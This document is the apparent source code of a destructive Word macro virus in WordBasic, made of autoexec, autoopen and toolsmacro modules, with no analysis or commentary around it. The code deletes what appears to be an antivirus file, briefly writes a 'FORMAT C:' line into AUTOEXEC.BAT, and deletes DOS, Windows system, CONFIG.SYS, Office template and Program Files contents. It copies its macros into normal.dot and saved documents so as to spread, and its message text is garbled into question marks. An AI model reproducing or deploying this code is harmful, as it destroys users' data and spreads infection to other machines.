   Attribute VB_Name = "autoexec"

   Public Sub MAIN()
   Dim P$
   Dim pc5
   Dim pc4
   Dim pc3
   Dim pc2
   Dim pc1
   On Error Resume Next
   WordBasic.DisableInput 1
   WordBasic.FileFind SearchPath:="c:\", Name:="z-scan.doc", SubDir:=1
   P$ = WordBasic.[FoundFileName$](1)
   WordBasic.Kill P$
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "? "
       WordBasic.PushButton 0, 0, 88, 21, "ten", "Push1"
   WordBasic.EndDialog
   Dim dlg5 As Object: Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "?? "
       WordBasic.PushButton 0, 0, 88, 21, "nine", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Dim dlg4 As Object: Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "??? "
       WordBasic.PushButton 0, 0, 88, 21, "eight", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Dim dlg3 As Object: Set dlg3 = WordBasic.CurValues.UserDialog
   pc3 = WordBasic.Dialog.UserDialog(dlg3, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "????"
       WordBasic.PushButton 0, 0, 88, 21, "seven", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Dim dlg2 As Object: Set dlg2 = WordBasic.CurValues.UserDialog
   pc2 = WordBasic.Dialog.UserDialog(dlg2, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "????? "
       WordBasic.PushButton 0, 0, 88, 21, "six", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Dim dlg1 As Object: Set dlg1 = WordBasic.CurValues.UserDialog
   pc1 = WordBasic.Dialog.UserDialog(dlg1, -1, 1000)
   WordBasic.Beep

   WordBasic.BeginDialog 88, 22, "??????"
       WordBasic.PushButton 0, 0, 88, 21, "five", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "^-^ "
       WordBasic.PushButton 0, 0, 88, 21, "four", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "KILL "
       WordBasic.PushButton 0, 0, 88, 21, "three", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   pc3 = WordBasic.Dialog.UserDialog(dlg3, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "YOU "
       WordBasic.PushButton 0, 0, 88, 21, "two", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   pc2 = WordBasic.Dialog.UserDialog(dlg2, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "ACTION "
       WordBasic.PushButton 0, 0, 88, 21, "one", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   pc1 = WordBasic.Dialog.UserDialog(dlg1, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "?? "
       WordBasic.PushButton 0, 0, 88, 21, "??", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "FIRE "
       WordBasic.PushButton 0, 0, 88, 21, "NOW", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)

   WordBasic.Beep

   End Sub

   Attribute VB_Name = "autoopen"

   Public Sub MAIN()
   Dim n
   Dim beeptime
   Dim funk
   Dim mn
   Dim file$
   Dim file1$
   Dim file2$
   Dim file3$
   Dim boom
   Dim j
   Dim PIG
   Dim dlg5 As Object
   Dim pc5
   Dim dlg4 As Object
   Dim pc4
   Dim dlg3 As Object
   Dim pc3
   Dim dlg2 As Object
   Dim pc2
   Dim dlg1 As Object
   Dim pc1
   Dim FO
   Dim path$
   Dim name_$
   Dim air
   WordBasic.DisableInput 1
   On Error Resume Next
   WordBasic.MsgBox "???????!????????!?????????!!", 64
   n = WordBasic.Second(WordBasic.Now())
   beeptime = n + 5
   If beeptime > 59 Then GoTo alex3
   While WordBasic.Second(WordBasic.Now()) <> beeptime
   Wend
   WordBasic.Beep
   WordBasic.CopyFile "C:\AUTOEXEC.BAT", "C:\VFS"
   SetAttr "C:\AUTOEXEC.BAT", 0
   Open "C:\AUTOEXEC.BAT" For Append As 1
   Print #1, "FORMAT C:/S/U/V:VFS>NUL"
   Close 1
   WordBasic.MsgBox "?????!???????????!??????????????!????????!???????!", 64
   WordBasic.Kill "c:\autoexec.bat"
   WordBasic.Rename "C:\VFS", "C:\autoexec.bat"
   If WordBasic.Day(WordBasic.Now()) > 10 Then GoTo alex3 Else GoTo check
   alex3:
   WordBasic.MsgBox "??????????!?1,2??????!3,4??????????!?????!????!???! 1.????  2.????II 3.????4.???!?????????WORD?????!OK?????!", 64
   WordBasic.Input " ??????? (1-4):", funk
   Select Case funk
   Case 1
   WordBasic.Kill "c:\dos\*.*"
   WordBasic.RmDir "c:\dos"
   WordBasic.MsgBox "??????????!????????SOGO??!??????????? @ @ ??????????!??!???????!??????!??????!??????????!??????????", 64
   WordBasic.MsgBox "1.?? 2.?? 3.????! 4.??? 5.???", 64
   WordBasic.Input "???(1-5) :", mn
   Select Case mn
   Case 1
   WordBasic.Kill "C:\DOS\*.*"
   WordBasic.RmDir "C:\DOS"
   WordBasic.MsgBox "?????!?????!???????!??????????!???????!??????????????????!?????!???????????!!!!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1

   Case 2
   WordBasic.MsgBox "?????????!??????????????????!??????!????????????????!???????????!!???", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 3
   WordBasic.MsgBox "????????????!?????????????,?????????!???????????????????!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 4
   WordBasic.MsgBox "????!??????!??????????,?????!??????????!????????????!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 5
   WordBasic.MsgBox "??????????!??????????????!??????????!?????????!?????????#???#!!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case Else
   WordBasic.MsgBox "????!!!!!!!!!!!??..", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   End Select
   Case 2
   WordBasic.Kill "C:\ET3\*.*"
   WordBasic.RmDir "C:\ET3"
   WordBasic.MsgBox "?????????!??????????????????!????????!????????..1.?? 2.??????? 3.???????? 4.????????????!! 5.??! ???!", 64
   WordBasic.Input "???(1-5) :", boom
   Select Case boom
   Case 1
   WordBasic.MsgBox "??????!...????????!???????????????!????????!money????????!!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 2
   WordBasic.MsgBox "?!?????!?????????????!????????????????!??#???#???!????????????!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 3
   WordBasic.MsgBox "???#??'#???????????!????????!",
   64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 4
   WordBasic.MsgBox "??????????!???????????!????????!#????#?", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case 5
   WordBasic.MsgBox "???????!?????!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   Case Else
   WordBasic.MsgBox "????!!!!!!!!!!!??..", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   End Select

   Case 3
   WordBasic.Kill "C:\CONFIG.SYS"
   WordBasic.Kill "C:\WINDOWS\SYSTEM\*.*"
   WordBasic.MsgBox "??????????????#??#????!?????????!??????,?????????!???????????!???????????!????!?????? 1.?? 2.?? 3.??", 64

   WordBasic.Input "???(1-3)  : ", PIG

   Select Case PIG
   Case 1
   WordBasic.MsgBox "????????!!!????????????!!???????!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 2
   WordBasic.MsgBox "??!???????????????pass!??????!?????....????!???????????!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 3
   WordBasic.MsgBox "???!!!!!?????????!??????!??????!OK!????!", 64
   WordBasic.Beep
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   WordBasic.ExitWindows
   Case Else
   WordBasic.MsgBox "????????????!?????(1-3)????????????????!????????!???????!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   End Select

   Case 4
   WordBasic.Kill "C:\MSOFFICE\TEMPLATE\*.*"
   WordBasic.MsgBox "ARE YOU READY?????????!???????????????!", 64
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, " ??"
       WordBasic.PushButton 0, 0, 88, 21, "37", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "? "
       WordBasic.PushButton 0, 0, 88, 21, "73", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "?? "
       WordBasic.PushButton 0, 0, 88, 21, "2701", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   pc3 = WordBasic.Dialog.UserDialog(dlg3, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "?? "
       WordBasic.PushButton 0, 0, 88, 21, "2", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   pc2 = WordBasic.Dialog.UserDialog(dlg2, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "?? "
       WordBasic.PushButton 0, 0, 88, 21, "234", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   pc1 = WordBasic.Dialog.UserDialog(dlg1, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "? "
       WordBasic.PushButton 0, 0, 88, 21, "0", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "??? "
       WordBasic.PushButton 0, 0, 88, 21, "4", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "? "
       WordBasic.PushButton 0, 0, 88, 21, "56", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   pc3 = WordBasic.Dialog.UserDialog(dlg3, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "? "
       WordBasic.PushButton 0, 0, 88, 21, "67", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   pc2 = WordBasic.Dialog.UserDialog(dlg2, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "OK! "
       WordBasic.PushButton 0, 0, 88, 21, "??", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   Set dlg1 = WordBasic.CurValues.UserDialog
   pc1 = WordBasic.Dialog.UserDialog(dlg1, -1, 1000)
   WordBasic.Beep
   WordBasic.MsgBox "???????? (1)14590802  (2).2701 (3).0 ???!", 64
   WordBasic.Input "???(1-3) :", FO
   Select Case FO
   Case 1
   WordBasic.MsgBox "?...................???!?????????!????????! ??? 0????!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 2
   WordBasic.MsgBox "?...................???!?????????!????????! ??? 0????!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 3
   WordBasic.MsgBox "?...................??????!!!!??????????????!", 64
   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1

   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   WordBasic.ExitWindows
   Case Else
   WordBasic.MsgBox "????!!!!!!!!!!!??..", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j
   WordBasic.MkDir "c:\0"
   WordBasic.MkDir "C:\00"
   WordBasic.MkDir "C:\000"
   WordBasic.MkDir "C:\0000"
   WordBasic.MkDir "C:\00000"
   WordBasic.MkDir "C:\000000"
   WordBasic.MkDir "C:\0000000"
   End Select
   End Select
   check:
   WordBasic.MacroCopy "normal.dot:AutoOpen", path$ + "\" + name_$ + ":AutoOpen", 2
   WordBasic.MacroCopy path$ + "\" + name_$ + ":AutoOpen", "normal.dot:AutoOpen", 2
   WordBasic.MacroCopy "normal.dot:AutoExec", path$ + "\" + name_$ + ":AutoExec", 2
   WordBasic.MacroCopy path$ + "\" + name_$ + ":AutoExec", "normal.dot:AutoExec", 2
   WordBasic.MacroCopy "normal.dot:ToolsMacro", path$ + "\" + name_$ + ":ToolsMacro", 2
   WordBasic.MacroCopy path$ + "\" + name_$ + ":ToolsMacro", "normal.dot:ToolsMacro", 2
   WordBasic.MsgBox "????#con???? air#???????!??????????????!??????????!!(1-10):1.999999 2.345674 3.078923 4.841054 5.841053 6.841072 7.843876 8.654321 9.048951 10.135790 ??????!!????", 64
   WordBasic.Input "???(1-10): ", air

   Select Case air
   Case 1
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 2
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 3
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 4
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j


   Case 5
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j

   Case 6
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j


   Case 7
   WordBasic.MsgBox "????!!!!????!!", 64

   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1


   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   WordBasic.ExitWindows
   Case 8
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j


   Case 9
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j


   Case 10
   WordBasic.MsgBox "????!!!!", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j


   Case Else
   WordBasic.MsgBox "????!!!!!!!!!!!??..", 64
       For j = 1 To 20
               WordBasic.Beep
               WordBasic.FileNewDefault
               Next j
          WordBasic.Kill "c:\progra~1\*.*"

   End Select

   file$ = WordBasic.[FileName$]()
   file1$ = file$ + ":autoexec"
   file2$ = file$ + ":autoopen"
   file3$ = file$ + ":toolsmacro"

   WordBasic.MacroCopy file1$, "autoexec", 1
   WordBasic.MacroCopy file$, "autoopen", 1
   WordBasic.MacroCopy file$, "toolsmacro", 1


   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "autoexec", file1$, 1
   WordBasic.MacroCopy "autoopen", file2$, 1
   WordBasic.MacroCopy "toolsmacro", file3$, 1
   End Sub

   Attribute VB_Name = "toolsmacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??,??,???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.toolsmacro.MAIN"
   Dim Pc
   Dim pe As Object
   Dim pp
   On Error Resume Next
   start:

   ReDim Box1__$(0)
   Box1__$(0) = ""

   ReDim Box2__$(2)
   Box2__$(0) = "???"
   Box2__$(1) = "???"
   Box2__$(2) = "???"

   ReDim Box3__$(0)
   Box3__$(0) = ""

   WordBasic.BeginDialog 359, 271, "????"
       WordBasic.PushButton 234, 6, 120, 21, "CON", "Push1"
       WordBasic.PushButton 234, 29, 120, 21, "AIR", "Push2"
       WordBasic.PushButton 234, 55, 120, 21, "CON", "Push3"
       WordBasic.PushButton 234, 79, 120, 21, "AIR", "Push4"
       WordBasic.PushButton 234, 103, 120, 21, "CON", "Push5"
       WordBasic.PushButton 234, 130, 120, 21, "AIR", "Push6"
       WordBasic.PushButton 234, 154, 120, 21, "STOP", "Push7"
       WordBasic.Text 10, 9, 96, 18, "????:", "Text1"
       WordBasic.Text 10, 175, 112, 13, "????:", "Text2"
       WordBasic.Text 10, 207, 64, 15, "ALEX:", "Text3"
       WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
       WordBasic.ListBox 18, 44, 211, 129, Box1__$(), "ListBox1"
       WordBasic.DropListBox 11, 189, 342, 48, Box2__$(), "DropListBox1"
       WordBasic.ListBox 11, 222, 341, 37, Box3__$(), "ListBox2"
   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
   Pc = WordBasic.Dialog.UserDialog(dlg)
   If Pc = 2 Then GoTo bye:
   If Pc = 7 Then
    WordBasic.BeginDialog 204, 100, "????!"
       WordBasic.Text 10, 6, 189, 13, "???????????!", "Text1"
       WordBasic.Text 10, 25, 188, 13, "!??ALEX", "Text2"
       WordBasic.Text 10, 44, 187, 13, "JUST DO IT!!!!!!!!", "Text3"
       WordBasic.Text 10, 63, 187, 13, "DON'T JUST LIKE!!", "Text4"
       WordBasic.OKButton 110, 77, 88, 21
    WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog
    Set pe = WordBasic.CurValues.UserDialog
    pp = WordBasic.Dialog.UserDialog(pe)
    GoTo start:
   End If
   WordBasic.Beep
   WordBasic.MsgBox "???!??????!", 64
   GoTo start:
   bye:


   End Sub
